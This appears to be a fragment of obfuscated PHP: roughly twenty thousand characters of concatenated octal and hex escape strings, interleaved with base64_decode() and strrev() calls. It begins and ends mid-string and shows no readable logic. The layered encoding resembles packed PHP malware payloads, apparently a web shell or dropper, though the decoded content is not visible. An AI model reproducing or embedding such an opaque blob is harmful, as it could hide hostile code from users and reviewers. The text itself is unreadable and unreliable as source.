4\76\320\240\36\376\102\212\310\362\313\260\166\167\207\370\61\27\355\101\21\50\36\67\233\54\315\362\175\0\5\313\137\222\125\35\2"."\x84\xa3\x5\x28\x95\x8\xe\x4f\x60\x54\xbc\x3\x44\xc9\x4c\xb3\x17\xc5\x72\xcc\x5a\x4\x46\x7\x58\x49\xd5\x48\x28\xab\x4d\xc4\xf9\x6a\x6\xa3\xc7\xb2\x18\xea\x13\xb8\x15\xa0\xc4\xc2\x5a\x4f\x3a\x86\x32\x3e\x4a\x1c\xf4\x7e"."\214\334\115\41\23\214\61\65\147\321\357\217\13\145\213\216\22\1\177\201\62\43\35\126\174\274\115\76\0\35\214\270\170\357\41\77\132\310\141\76\276\322\156\233\53\364\244\256\161\55\373\212\7\40\150\54"."\x52\xfd\x1e\x56\x38\x75\xa2\xb0\x59\x30\xd9\xa1\x14\x85\xf8\x29\x0\xdf\x94\x7a\x99\x57\x10\xa1\x0\x7b\x92\x2d\x8f\x27\x25\xbc\x73\x60\x70\x77\x20\x5e\xe6\x5e\x48\xf4\x11\x82\x1d\xa0\x8\x37\x90\x6\x71\x5e\xc7\x1d\xf\xd1"."\62\130\353\113\172\316\125\324\265\14\30\11\103\250\27\204\207\252\203\31\172\45\146\25\44\326\40\21\117\4\102\375\1\352\142\237\20\25\73\77\327\144\376\256\207\200\312\125\321\5\240\125\27\100\110\360"."\x32\x97\xb4\x22\x10\x8a\xff\x83\xc2\x96\x8e\x7d\xd4\x4a\x1d\x70\x6f\x61\x2b\x99\xa4\xf3\x1b\x6a\xb8\xb7\x16\xf\x21\x55\xcd\x4b\x28\x0\xb6\x89\x5f\x57\x59\xe1\x15\xb4\x42\xe8\xbc\x83\x10\xf8\x9b\xa7\x9e\x47\x3\x17\x10\xe"."\201\252\313\16\172\304\143\314\52\43\150\35\245\212\341\100\164\335\13\257\161\330\114\26\142\350\52\333\205\274\346\161\361\325\26\265\137\167\43\36\145\122\66\103\35\176\25\230\263\135\330\124\314\265\161\274"."\xca\x17\x48\x26\x96\xc5\x45\x6f\xbf\x5d\xc9\x74\xc6\x6\x62\x84\x51\x1\x50\xb8\xa4\x8e\x74\x3d\x81\xf8\x48\x79\x5b\xbf\x36\xd\x78\x8f\xec\x5e\xe8\x6a\x94\xea\x86\x54\x20\x17\x4d\x18\xd2\x40\x54\x5a\xe4\x6a\x5e\x26\xd\x5"."\x87\x16\xb5\xd6\x4b\x40\x42\xcb\x29\x43\x4a\x62\xa5\x6a\xba\x17\xb6\x2c\x76\xb5\x2c\x92\xea\x56\xf6\x46\xfb\xfb\x1c\x12\x34\xcb\x91\x7a\x80\xc4\xa7\xd5\x4b\xde\xac\xae\xe5\x15\x77\xf3\x62\x68\x60\xd0\xba\xb0\xc5\xb5\xb4\x55"."\212\310\151\131\127\111\56\302\341\210\162\344\4\371\205\317\65\305\205\52\307\205\75\51\136\244\161\30\335\321\103\352\223\4\4\174\35\105\56\275\206\141\121\104\327\17\220\70\172\10\112\54\15\225\100\224"."\x7a\xc4\x8d\x2f\xc4\xb5\x12\x87\xb5\x58\x88\x30\xc2\x71\x25\xf8\xea\x8b\xe5\x9e\xed\xc8\xb3\x28\x7b\x6\x73\x88\xcf\x45\xc8\xeb\x5\xfa\x83\x51\x46\x6d\x50\xb\x3a\x27\x3e\x9f\x33\xa4\xa6\xd8\x2d\xf5\x70\xcc\x18\x69\x88\xb9"."\373\225\224\52\167\151\223\70\72\214\176\220\242\44\324\72\253\207\321\5\377\113\264\41\66\102\265\224\340\7\173\25\276\263\162\317\17\371\272\235\34\235\355\344\220\267\135\356\63\232\124\14\371\12\344\137"."\240\345\323\322\243\366\215\34\16\143\127\372\70\354\205\243\0\326\174\37\133\332\0\303\346\21\64\110\26\134\246\260\242\153\251\122\222\26\31\262\304\212\251\364\52\161\103\351\43\363\12\111\131\342\303\67".base64_decode('k0DMZi3SY4URNPchFLUDwxosbcOwBfPn+4PdTDuRY0w2N45YY8vrhgvpkeX1dTDjDIHhUmj30gM=')."\x10\x4b\x55\xc4\xaf\x5a\xba\x77\x81\x96\x18\x75\xab\x64\xb7\xe7\x26\xf4\x83\xea\xd6\xde\x5e\xe7\x6a\xa8\xef\xec\xe4\x9b\x41\x37\x24\x42\x4b\x9\xac\xce\xd0\x43\x62\x65\xd9\x96\x48\x98\x22\xeb\xcc\x9b\xa2\x1b\x48\x12\xfa\x54"."\361\277\316\251\140\164\222\31\336\347\375\267\71\335\1\37\351\360\341\21\34\150\7\175\262\256\163\244\241\176\270\263\12\204\345\13\351\112\271\152\223\101\277\261\361\216\221\347\233\142\104\126\217\321\127\235".base64_decode('iM5djCjdUf04pi9Hm1IXi8VSyME1020mEOYTve5oEG8WMTCAIhxN8dqHZWca1bUTIDOV13ZXQ+c=')."\x3c\x9a\x19\xdd\x35\x50\x2\xd9\x7b\x2e\x35\x4f\xea\x6d\x60\x5f\x9f\xec\xf6\x83\x3f\x46\x94\xc7\x90\xe2\xd1\x35\x4\x41\x6\xac\xda\xe9\x1f\x88\x6\xa2\x1\x3f\xd1\xe9\xde\x65\xce\xdc\x6f\xee\x4d\xfa\x80\xe8\x4f\xee\x3d\x97"."\x16\x9\x3a\x37\x36\xd9\xd8\x8\xfe\x96\x82\x3f\x19\xfc\x25\xc1\x5f\xa\x92\x70\xcc\x0\xff\x2e\x1\x7f\x20\xa5\x5\x40\x5b\x94\xd8\xe4\xc2\x4\xf8\x3\xa9\x8b\xc1\xef\x62\x88\x95\x6\x7f\xb\x39\x17\xe9\xec\xe4\x5\x83\xd6"."\172\234\335\240\331\325\12\7\131\72\31\205\13\25\204\273\365\304\50\345\233\364\120\1\276\37\240\310\164\16\311\71\346\173\102\170\133\12\176\62\246\303\171\7\147\35\237\36\165\320\62\20\341\301\331\132"."\xa5\x26\x1c\x97\x61\x5a\x1a\x31\x1b\xd\xf\xfe\x67\x2c\x71\x1a\xb3\x66\x2d\x70\xba\x1a\x9b\x9a\x5b\x5a\x17\x2e\x5a\xbc\x84\x1c\x66\x17\x4a\x79\x45\xa7\x47\x25\x6e\xe4\x4a\xb0\x5\xfe\xa8\x29\xfa\xc3\xf\x64\xac\x47\xbb\x45"."\203\232\311\347\231\5\72\340\215\124\26\20\364\165\14\121\303\151\114\231\352\247\47\13\160\251\114\303\333\42\222\266\244\53\104\50\307\35\33\206\334\46\106\51\21\172\123\25\164\146\110\54\222\245\336\356".base64_decode('5zc2p9rYPzYYlZMyhkuoK35MSC6BNlFtrdFihlcsKrw7BIjA8OIbTeGQGJYolC2cLKI4fIiJCkQ=').strrev('-äšÙ…ÅŞBôrPV»p]åP”kD=Â6³"‘J;áyvè_åÚTBá^'."\0".'šbñoPK')."\52\31\107\261\220\161\144\324\264\43\221\57\72\114\65\235\206\377\70\300\30\72\212\311\224\303\50\147\34\112\132\236\164\114\50\211\42\365\21\255\67\73\24\75\355\30\113\45\35\251\244\356\110\201\2\12"."\xfa\x84\xa3\xa0\xa4\x1d\x1a\x80\xeb\x13\xcd\x8e\x22\x8\x1b\x0\x26\x83\x3f\x43\x27\x5e\x2c\xca\x6a\x4a\xd1\xc0\xa6\xc8\xd0\x72\x25\xa4\x1f\x35\x39\xb\x7c\x8a\x8a\x41\x14\xb2\xda\xd2\xb\x81\x6e\x5f\xa3\x6b\x75\x98\xa5\x4e"."\72\146\111\260\27\263\346\53\213\231\262\24\263\306\136\214\230\350\243\316\275\127\340\41\241\161\374\64\224\234\203\316\302\311\177\223\371\242\13\376\41\61\102\201\210\16\64\346\53\240\137\3\101\301\301\105".base64_decode('EdG9zRQXRjRdBeKyXL0iQXuioaXNCaZpJaJGSIpQN1IRlkLiRiWmpRWaHmWPpyRUMwQ20DJXPcQ=')."\xa3\x9\xe0\x46\xbc\x8\x6d\x2a\x85\x24\x8\x4\xd8\x21\x75\x92\xda\x35\xaf\x70\xe1\x1b\x5e\x8e\x5f\x84\x89\xe\x6\xd7\xe5\x9\x5b\x1a\x21\x42\xdb\x24\xa8\x3e\x41\x40\x39\x70\x76\xd0\xc2\xe0\x89\x66\x1c\x1e\x68\xa\x2d\x5b".base64_decode('4Qr0+sIuVB4yv+PfhteWumjEjz/KBGyGmMlpCTkXx2Xw2y+5ALgKM6Jf4cJxUJrLmpKhWk05rZA=').strrev('²Â*xKxóƒœ3É’R„ªÇ—éRjÊR‘Šß	ÿsÁ`ÈŞP9(l¸2¥UP¦ÚÊRÍQ')."\xf0\x37\x7e\x10\xf3\xf5\xb1\x23\x3d\x31\x4b\x80\x26\xc1\x73\x6c\xd0\x75\x34\x37\xca\x92\xe2\x70\xa1\x20\x8f\xc0\x42\xc5\xa2\x30\x6b\xa5\x5\x88\x8c\x36\x9\x38\x23\xb5\x63\xf4\x0\x42\x83\x6a\x3c\xdd\xe2\xce\x83\x14\xe3\xd"."\366\207\6\243\176\237\253\52\22\5\12\67\17\42\125\126\111\206\307\310\140\273\216\16\22\147\311\65\13\12\122\353\2\205\361\243\117\61\123\145\152\67\124\350\27\265\2\105\364\212\104\1\20\50\264\54"."\314\347\273\325\134\225\205\350\53\320\100\122\311\360\201\16\226\13\266\31\312\372\260\12\112\40\22\104\15\5\253\24\177\167\125\374\142\125\204\241\254\152\52\135\162\256\342\123\50\113\145\52\355\35\256\275"."\127\255\357\170\52\205\164\251\262\61\313\50\125\240\370\127\11\13\61\11\312\111\207\234\62\15\207\134\162\310\171\335\41\227\165\107\102\53\214\71\122\106\32\374\31\16\260\364\302\344\164\16\40\346\144\107"."\16\60\60\107\136\115\251\216\74\10\250\246\143\62\357\60\132\362\144\21\316\27\101\142\261\305\241\245\165\207\76\6\212\64\262\160\156\214\71\46\344\262\143\42\57\73\362\255\262\103\313\144\34\345\361\264"."\x63\xa2\xec\x28\x6b\x49\x87\x49\xcf\x7e\xa9\x98\x14\x37\x44\x55\xc1\xf1\x92\x9a\x1c\x83\x60\x17\xfc\x7\x8c\x4b\xbe\x68\xc4\x4b\x5\x75\x92\xba\xd2\xce\x6b\x5a\x59\xca\x97\xb3\xa9\xff\x84\x8f\x1d\x5e\xdb\xf1\xb1\x50\x2\xf8"."\236\256\31\143\262\13\251\54\51\272\175\71\142\351\303\4\141\6\352\364\201\321\226\213\105\7\20\150\122\140\333\211\354\120\107\354\71\171\175\206\331\52\110\365\242\342\120\122\23\163\340\312\320\117\140\71"."\101\320\366\200\211\170\345\212\353\226\343\157\346\221\3\36\247\210\42\52\21\271\100\161\324\263\15\136\31\5\245\174\214\62\333\312\150\377\274\5\64\14\344\355\162\323\14\374\267\171\106\6\274\265\254\351"."\x9\xd5\xa0\xf\x21\xb1\xa6\x8f\x88\xc2\xe6\x7f\x9f\x49\x64\x86\xff\x43\x2e\x2e\x9f\x66\x94\x82\xfe\x3f\x7f\x55\xc8\x34\xa5\x50\xa3\x98\xff\x3e\x3b\xcf\x3\x3a\x8a\xda\x4e\xff\xf\x1d\x5\x33\xc5\xc5\x37\xc9\x8\x92\xe1\x2a".strrev('4‰	'."\n".'ÂyƒÎfP¬~G	Ëç¡ÕhÌZò;+4Á•ªp­Ò;-,ÁZ÷:Ä‚_~.]©ÈIª')."\x99\xbb\x2d\x99\x66\x47\x4b\xa6\xe8\x90\xc1\xc4\x4f\xa8\x80\x3\xa8\xe5\xb4\xa3\x60\x94\x1d\x60\xf6\x83\xff\x4f\x98\xa0\x38\xf0\x9b\x7\xb2\x48\x1e\x4a\xe8\x79\x20\xaa\x97\xb5\x4\x65\x3b\x50\x23\xd7\xa5\x15\xe0\x93\x0\xd0".strrev('0‰K´‹…r3ÃÚ-®P²p²¶f¿áNÁqj‡$›	ÖÊÿÔÃ2­äè³ñ+®f9İk¾a').base64_decode('wcHkT45GMsOrlmQ8p2ljpaLACnAq3mUbruHGppmmERef3v8JExf7n7AQYxCQeM9gdJQe/+oqki8=').base64_decode('CRmEPSTnm5xfzoj8coYwuxGL8GsnDsZ1YQLsBHoWSn4ruO6wDvaM4ryqsnsgIhdlxvRddUtF2OQ=')."\xfb\xa\x2c\x1b\x9b\xb7\x30\x77\xb\x8b\xce\xb3\xc5\xdb\xb2\x13\xae\x0\xa3\x41\xc1\xe1\xa\x7e\xae\x27\xb3\x2a\xbd\x75\x42\xb7\x26\x5c\xf0\x2f\x15\xe8\xd6\x40\x49\x9\xf2\x3e\x7d\x60\x5e\x78\xcb\x6\xb4\x8\xec\xd0\xa0\xf7"."\22\6\2\235\50\74\141\41\150\122\151\114\102\101\223\5\7\173\372\202\135\36\344\160\40\336\33\244\17\64\167\164\164\242\43\143\366\266\64\240\27\47\370\120\206\75\226\70\44\353\120\201\301\21\45\72".strrev('œZ¼ğœ†††‹ÏA²š.áëX0HCQ/AÆÑ `m8+Ú0g¸¡½BGbç"Ö»´•It')."\x24\xd1\x23\xd6\x5d\x30\x51\x82\x8c\x30\xdf\x51\x33\xa6\xa5\x92\x39\xad\x94\xaa\xe1\x5\xba\x9b\x5c\x8d\x52\x6b\x63\x93\x34\x58\xa0\xba\x96\x74\x7b\x44\x5f\x26\x2f\x68\x4e\xe1\x49\x41\xdb\xdb\xe4\xd6\x44\xcb\xb3\xb9\xf4\xe3"."\x38\x9\xec\x25\x0\x59\x9\x3b\xe6\x60\x59\xd1\x5\xb3\x1\xfa\x12\x34\xf9\xed\xf\xae\x22\xea\xc0\xde\x60\x88\x9c\x1f\xf4\xaf\x64\x7a\x28\x3e\xa5\x48\x85\x66\x6f\xc5\x13\xc3\x48\x75\x66\x32\x9f\x5b\xc6\x14\x73\x84\x53\xd1".strrev('©}9¼ò1ãà„5ÜÀ;¨`áBÄdˆæîÙİÉTÁËœ’A:jÚ«<øÔuóhÁN'."\0".'’µiŠ×Q[_v')."\236\174\312\242\60\136\3\172\272\206\53\214\327\240\72\325\110\324\231\33\62\301\301\301\46\352\150\124\264\115\45\112\227\320\306\114\350\7\30\145\146\52\210\100\174\176\150\225\57\220\107\226\235\202\333\154"."\x23\x30\x90\x98\xe7\xf5\x8a\xe6\x79\xa0\x23\xe0\xfa\x4\x6f\xc8\x61\xaf\xc2\x8e\x49\x42\x75\x21\x34\x69\x70\xd7\x58\xd2\x59\xae\x8c\x62\x92\x5b\x59\x4\x87\xb5\x4b\xb9\xe1\xba\xe3\xc4\x4f\xb6\x6b\xfa\x14\xcc\x6c\x43\xab\xfa".base64_decode('Uar1hCz6+R0zuboms1yw7uWWyQlmsQCKRPd1toEm0UhHDTHfo/MCMsOaTsz32iNtyiQcVNDkziA=').base64_decode('es55QDOR2lO7W0wDiETLtZMNF8SgQFQcbDWqSqeVaOF+vU1ib3Fzii2ZaUKwq2R9qk2q8qZ3rqo=').base64_decode('srmJSiRMrD9addJC2yNQtY4li1obGx35kmE6dcX6tirsKImcH/ZHnHhiO1epgB/4qBUzelq9TSI=')."\23\301\41\321\371\201\103\41\117\324\333\353\220\20\261\72\244\36\177\24\200\7\301\77\130\325\337\41\301\171\15\222\301\74\167\110\320\206\330\41\15\16\340\137\256\246\15\372\16\223\5\62\262\101\135\11".base64_decode('4pCiKdG4SZQkwRkL1WNIr2MAHdF825BaaGmGWtrYjAju0wkxAO5Y0gtt2OeQ4cyrSbCqgxXVCUg=')."\242\15\352\340\131\313\240\27\231\377\377\45\300\132\120\125\361\377\377\122\240\312\204\307\4\213\114\242\144\52\306\377\124\6\145\160\254\253\260\132\121\47\131\25\232\244\346\306\106\51\270\22\242\221\224\271"."\x42\x2e\xda\xc9\x84\x17\xe0\xf1\x21\xab\x34\x56\xcf\x48\xc9\x65\xfa\x7a\x6b\x16\x4e\x32\xb5\x50\xa4\xce\x17\x11\xa3\x2\x3\x1f\x16\x5e\xb5\xd7\xac\xcb\x41\xd4\xc2\xad\x49\xc3\x52\x94\x53\x93\xd1\x86\x5a\xee\x29\xb8\xc9\x0"."\171\247\130\73\340\332\136\126\140\32\355\54\214\211\131\131\252\15\175\5\163\61\6\266\40\202\2\61\46\230\344\271\222\1\12\343\330\70\215\241\247\340\72\324\251\26\340\143\257\46\342\155\30\302\20\264"."\x89\x82\x42\x27\x3d\xcc\xf\xed\xec\xdc\x8\xe8\xe6\x8c\x19\xe6\xc3\x88\x2c\x1f\x71\x56\xd9\x19\xc0\x45\x2b\x10\x85\xc2\xac\xad\x82\x56\x55\x9d\x74\x56\x68\x45\x79\xbc\xa4\x30\x78\x9b\x6d\x96\xb0\x36\xa3\x4c\x8c\xc\x6c\x3d".base64_decode('RrEsXcvIBRcJH1dzRtE3OAMq4BWiTYIej52An5QrWHIFLcABnZUnzrqIf+XKirVw6cKKiA0HVzs=').base64_decode('/ZNFUEclBVZqsGGfshjsutdhmwx8bddQ76QB5myI3PIQu/4yWqYIk4bSKAmXwXyAXkpTTXZAM8U=')."\326\322\151\170\34\101\142\4\13\355\47\151\26\274\131\244\261\142\116\56\50\6\215\201\254\242\140\273\112\314\270\312\232\221\241\322\144\341\154\135\254\172\34\33\53\22\310\144\274\250\344\360\141\11\62\43"."\xa3\xf0\xa9\x59\xe0\xc9\x9c\xe\xbd\x9a\xa5\xc4\xb8\x9a\x87\x57\x8c\x32\xab\xa4\xe\x44\x76\xc0\x8d\xc6\x28\x4e\x46\x57\x94\x82\x5\x92\xc8\x95\x14\xb\x40\xce\x15\xb3\x32\x82\x60\x0\x79\xa9\xc1\x9b\x70\x7b\x33\x6e\xaf\xee"."\xf6\x92\xad\x36\x79\xca\x8b\xbc\xbf\xec\x25\xab\x16\xf1\xd7\x44\xdf\x77\x40\xd\xc4\x3b\x69\xe8\x49\x26\xa3\xa6\xab\xc2\xe1\xd5\x5c\xd5\x84\x22\x95\xea\x26\xb8\xc6\x4e\x56\xd0\xa5\x11\xd0\xe1\x65\x35\xba\x93\x10\x52\xc2\x9a".base64_decode('ydZWbtuDktI5quYV6O+Jd/cFQnEk4gcHop4+WwLgmdGAtwLcFaS+ZG21TuStamhqAS3zIe4TB0Q=').base64_decode('ZYP5UiUuCkkeqNOPg8vaE7qbmikmhA2PkZdzTKHJTfXM3UaJiAjEbUpfgMwdN9nf9akJaszj7Vs=')."\13\232\0\275\133\4\303\236\360\32\356\65\27\244\104\75\341\131\122\140\36\342\234\216\372\113\133\266\142\305\12\372\144\147\62\207\355\32\241\156\77\273\57\7\120\170\372\244\124\102\345\112\114\250\226\207"."\x6c\x7a\x2c\xf7\xed\x61\x59\xf7\xe0\x16\x54\x49\x5c\xab\x16\x67\x49\x54\x8b\xf4\x39\xa\xfa\x9a\x80\x52\x2c\xd1\xcb\x6c\x76\x9c\x26\xf8\xb2\x59\x4c\x7e\x27\xc9\x6f\x62\x9a\x90\xb5\xac\x13\xdd\x81\xa4\x4c\xf2\xab\x6\x39\x1f"."\313\114\103\325\67\32\6\53\115\216\237\143\42\145\340\21\311\53\27\152\115\51\10\320\226\111\375\320\250\250\220\221\246\101\313\261\333\144\203\173\340\60\262\112\56\27\207\52\157\244\272\311\254\46\331\67"."\220\64\72\373\67\170\61\4\314\336\12\201\314\23\124\220\114\52\62\223\205\333\176\356\157\202\330\334\271\134\104\211\7\272\51\0\314\304\212\204\74\142\122\377\3\350\330\40\16\370\234\340\70\21\112\112"."\x12\x5c\x5a\x90\xf9\x82\xc5\xc7\xcb\x4a\x2d\x45\x86\xad\xd\x3b\x76\x49\x29\x93\xcb\x24\xe4\xb5\x88\x38\xbf\xae\xee\x28\x8\x7d\x46\x2\x9f\x81\x66\x5b\x12\xb6\x8e\xb5\x28\x8\x62\x84\xa\x48\x9b\x45\xcf\x10\x27\x54\x56\x78".base64_decode('fmNTo2CKEfD6I/FjI9AHZ1+A+oyxJgRAWjQ8S4onPFtKsOvYWVK8dP9gTekLBiOieyJb9QZDguM=').strrev('P’Íle%,8hv†°á™(x\\Mö‚•©[óJÅ7¨—±xF8(F+ü#ìÑwk†?²A')."\260\124\240\244\240\323\121\130\73\311\0\262\62\345\344\107\103\217\302\156\167\235\153\101\375\274\243\363\42\54\326\0\201\261\6\367\321\203\244\32\107\163\30\100\230\307\340\356\165\165\65\63\265\365\256\206".base64_decode('ulhTPVPfilFzsFisRJSfRja0buT+DWPDrobYyDxBm2wDAGxkgIksPQ9DbiMYltFQN1xTO+JqGF4=')."\27\213\215\300\140\75\200\265\101\170\54\342\152\250\167\54\237\347\36\124\15\21\37\173\151\236\25\207\164\71\65\10\53\262\303\175\50\262\250\140\227\204\114\40\104\175\332\220\37\60\145\301\7\234\231\57"."\12\144\13\335\224\55\152\25\65\312\61\204\56\51\45\272\366\241\40\265\272\52\162\315\172\253\62\55\213\132\146\113\243\324\5\104\65\213\51\262\305\121\235\120\73\175\201\120\120\134\164\317\210\40\342\43"."\37\60\56\274\170\52\324\25\310\153\202\107\25\130\20\365\70\104\4\1\331\310\316\342\202\7\173\303\0\15\20\352\204\130\213\13\156\370\205\205\266\327\346\112\212\154\243\52\373\20\207\1\41\223\251\205".base64_decode('8MCn0L6GOgnhiuITCdIDsI/jtg8yi+acsB3lOjBImuBaWDRKRaSkXIT3NSl8Mg46nnybhQZD0IE=')."\33\344\4\161\172\206\52\200\2\3\201\170\44\260\326\137\221\0\375\15\127\117\1\353\175\64\100\305\37\1\76\20\104\76\323\54\360\301\201\225\3\301\241\152\250\321\376\20\227\45\204\44\257\147\40\32"."\x17\xf6\xa4\x78\xb3\x2\xb6\x5c\x6c\xb7\x42\xb5\xd8\x93\x7a\xb2\xa5\x39\xc1\xa6\x19\xf3\x25\x46\x65\x79\x32\x53\xe8\x9a\xcf\xfd\x13\x4c\x3a\x99\x52\x3f\xdd\xef\xf8\xb8\x5b\x11\x92\xd\x1d\xbc\x92\x2a\x20\x27\x2b\x24\x83\x78"."\212\43\46\73\244\252\147\70\154\103\245\313\5\43\255\350\266\343\311\204\132\220\251\307\324\74\375\166\236\231\261\101\117\113\324\73\15\62\71\243\222\201\170\167\135\144\27\200\304\316\113\7\251\172\12\32"."\x25\x9\x67\x76\x5\x33\xac\x64\xc4\x68\x9f\xc6\x74\xf6\xd0\x6a\x5e\xa5\x8\xf8\x90\x8e\x60\x5b\x2\x37\x29\x9e\xa4\x59\x12\x1f\xec\x11\x9e\x38\x7\x31\xe1\xb9\x79\xc1\xbe\xce\xd9\x24\xb1\x16\xc5\x71\xc9\x38\xb2\x40\x48\xc0"."\x9a\xe2\x55\x6c\xf4\x6c\x8e\x6\x90\xd1\x2b\x9e\xbc\xd0\x81\x6f\x21\x52\x4a\x30\x27\x32\x36\xa3\x3a\xea\x96\x54\x12\xcd\xd9\xa8\xe3\x51\x58\x0\x7a\x63\x6\xb6\xc0\x10\xd3\x40\xb1\xf0\x85\x63\xde\x32\x31\xb\xfa\x66\x45\x16"."\x9c\x6\xad\xce\x38\x2b\x13\x53\xc\xa8\x90\x35\x48\xc5\xae\x6a\x29\x55\x3e\x85\x92\x84\x1e\x4d\xd2\x7d\x1c\x59\x8a\x48\x27\xae\xe1\x7d\x65\xd2\xfe\x6e\x76\xb6\x10\xf\x23\x9a\xe8\x4e\xe\xdb\xac\x91\xce\x75\x36\x4b\x2\x79"."\x41\xde\x23\x50\x4\x3e\x8d\x60\xdd\xc8\xad\x30\x73\x1c\x47\x83\xe\x12\x4\xd3\x24\x6e\xe5\x87\x5f\xc7\x61\x43\x8b\x9e\xd1\x61\x31\x5d\xb0\x0\x53\x52\x74\xe8\xd0\x33\x34\x55\xd7\x12\xc\x44\xef\xd4\x54\xb5\x91\xc2\x9d\x5"."\223\175\26\367\224\66\4\60\345\255\351\344\241\172\241\62\326\14\72\166\327\347\123\270\367\16\224\205\327\231\173\365\4\40\260\317\101\57\223\360\116\340\116\337\360\33\73\324\31\251\47\225\262\203\243\32"."\x3\x56\x3a\x8e\x73\x31\x37\xaa\xc4\x8d\x3b\xd8\x80\x46\x2\xc1\x81\xba\x7a\x28\x51\x59\xec\xf8\xfb\xa7\x98\xa3\x6d\x30\x6a\x68\xcd\xee\x97\x27\xf9\xa0\xb0\x8\x4d\x65\x34\x69\x58\x22\xd8\xd\xa2\x25\x37\x3\x31\xac\x9\x25"."\xc1\x58\x34\x61\x9a\xbd\x21\x37\x3\x75\xd1\x6e\x62\xef\xaa\x10\x6b\x66\xe8\xd5\x5e\x2c\x34\x48\xe4\xd3\x9\x6c\x2\x45\xf8\x66\x1b\xf3\xc\x49\xb7\x3f\x13\x79\x35\x29\xf5\x5\x7b\xe0\xde\xdb\x17\x88\xac\x94\x32\x8a\x29\x71"."\241\7\135\122\130\147\71\162\302\200\16\365\50\221\47\250\12\13\12\72\321\1\210\323\342\233\207\355\110\104\227\221\260\240\212\202\361\250\213\305\301\323\23\147\212\131\267\332\160\251\220\120\221\103\374\276".base64_decode('kAfuaKx8AYHJXsdazpQC7wGqf7tU5bsEP8fPToQMaqGsGiqf8rSrpkT8ir5ETREQoKcubvLNupU=')."\x7d\xa7\xc2\x14\x99\xc7\x31\xe\x79\xab\x4b\x30\x7a\xc5\x43\x22\x3e\x51\x27\xac\x6\xd0\xe1\x0\x58\x6a\xb9\xae\x5b\x91\xfa\x6a\x21\xd7\xeb\x94\x36\x48\x54\xb8\xa9\xb6\xbc\x65\x47\x92\xc1\x4e\x50\x56\x29\xa9\xe3\xb0\x90\x23"."\34\350\351\215\316\126\134\5\266\232\342\17\325\331\52\243\246\250\264\310\174\120\3\31\21\225\207\265\166\54\165\202\212\11\234\167\4\174\16\364\304\30\167\200\212\202\100\236\164\300\343\55\124\1\207\360"."\x56\x16\xba\x24\x26\xd3\x4a\xd5\x90\xe5\x29\x31\xdf\xc4\xb0\x40\x30\x8e\x1f\xc0\xc2\x51\xb7\x5d\x44\x4e\x23\xdb\x50\x64\x5d\x24\x78\x2\x72\xd3\x23\x47\xe6\xbd\x1a\x9e\x3c\xfb\xa9\x5f\x1a\x97\x49\x43\x10\xcc\x8d\x4d\x61\x46".strrev('âş'."\r".'Uîa±i¢ùüÇ7£)Û6©êvû ÓëZäF¤:C<M¸“H.%r2-f¹ıÚ,­Âú')."\x12\x13\xf8\x76\x8\xca\x5e\x5a\x7e\xaa\x2\x60\x31\x92\xef\xa3\xd5\x60\x2e\x47\xa1\x19\x49\x21\xad\x89\x2d\x43\x2c\xcb\xf\x58\x83\x3\x85\xb0\x6d\xb4\x3\x9e\x54\x9b\x21\x44\x4\x7d\x4a\x59\xb1\x66\x9f\xb5\x2c\xc3\xce\xeb"."\31\237\266\60\106\24\21\350\10\31\245\12\36\333\351\57\164\105\303\344\113\130\25\101\20\41\126\113\61\362\113\171\240\275\150\60\66\136\242\25\102\11\20\106\53\22\373\25\256\206\106\352\352\340\154\35"."\xdf\x46\x3\x10\x76\x69\x4\x2\x9c\xa2\x69\x9a\x30\xfc\x58\x1d\x3d\x8c\x1d\x1c\xba\xb0\xc7\xa\x2a\x77\x64\x54\xe6\xc5\xd4\x82\x46\xc8\x1d\x6c\x11\xf8\x61\xa1\xcd\xb7\xa\x59\xdf\xb0\x9f\x95\x52\x21\x80\xfd\xd6\x5b\xa0\xba"."\x20\x5e\x8b\xce\x6f\xb1\x77\x19\xee\x5f\x9c\xa0\x83\xaf\x85\xb0\x3b\x19\x32\x21\xc5\x22\xa9\xd7\x1e\xf4\x3\x5\x70\x40\xaf\xcc\xb6\xd9\x5d\xe9\xe5\x7\x3a\x60\x64\xe2\x3\x77\x58\x3a\xa6\x21\x29\xd6\x25\xca\xbf\x4\x41\x6a"."\227\350\174\61\114\13\35\101\221\3\110\43\16\24\100\304\51\12\111\325\241\26\342\104\50\154\300\320\123\210\154\354\140\217\222\37\237\222\146\342\43\214\363\175\206\370\62\7\155\2\46\214\212\157\240\137".base64_decode('uIl24DY6GLmoRh9SLzQiWMBycBfxDnw2j4xYOHPg3UHJPqPwD8IaRsWPWyQ5uxDHesmWIWzvyag=')."\126\351\20\201\273\65\52\224\362\334\177\24\210\130\5\130\54\332\123\127\22\137\321\334\222\236\163\40\325\130\7\175\257\316\201\237\113\165\130\212\100\25\212\233\102\203\231\64\145\33\256\212\217\375\27\245"."\x13\xf7\xb6\x48\xa0\x5\xa2\x1\xf6\x30\x81\x93\xda\xd0\xc5\x46\x75\x34\xd5\x42\x97\x60\xf7\xc8\x8f\x8c\xf1\x63\x9b\x45\x3b\xa3\x5c\x93\x4f\x35\xb7\x2c\x5c\x2a\xee\x17\xf9\x30\x72\xc7\x35\xe4\x28\x9f\x68\xf9\xd0\xa3\x31\x46"."\30\222\225\316\44\372\302\247\70\263\121\242\325\113\57\171\166\125\340\202\66\376\365\137\115\7\117\65\161\23\147\22\116\260\130\311\102\27\124\373\312\377\177\75\254\336\314\310\76\320\307\144\114\101\60\24"."\105\130\320\343\36\66\207\314\154\260\220\233\262\67\13\77\14\371\337\127\214\112\162\262\325\271\25\112\345\213\42\144\21\170\335\24\0\102\220\326\112\26\247\245\160\200\241\230\101\150\62\117\106\127\330\67"."\200\24\13\232\260\26\202\30\133\341\371\243\122\260\142\364\153\263\10\372\164\176\362\352\42\327\367\334\31\7\42\105\13\131\12\17\304\212\236\344\121\101\121\301\341\137\145\321\150\247\111\52\111\350\22\135"."\xc9\x23\x37\x73\x9e\x1e\xf6\x38\x0\xbc\xae\xe4\x55\x80\x31\xce\x8c\x4c\x8d\xa7\x98\x82\xdb\x7a\xc8\xbe\x82\xec\xbd\xd6\x54\xca\x22\xb8\x82\x38\xb7\x6d\x12\x66\x57\xca\x6\x14\x25\xd\x61\xb6\x82\x59\xa4\xa\xc2\x27\x91\xca"."\xb8\x98\x83\x1a\x2a\xb8\xb\x22\x9b\x61\xde\x53\x1e\x32\x2d\x53\xe\xf1\x59\x5c\x10\x65\x54\x47\xd6\xd\x32\xbf\x91\x9f\x60\xfc\x59\x61\x95\xe0\xb\x2\xf\xd\x50\xf5\x7f\x18\x11\x8e\x7d\x90\xb0\xc8\x12\xb3\xa2\x1c\x9\xdf"."\101\262\212\116\254\26\210\227\125\233\0\270\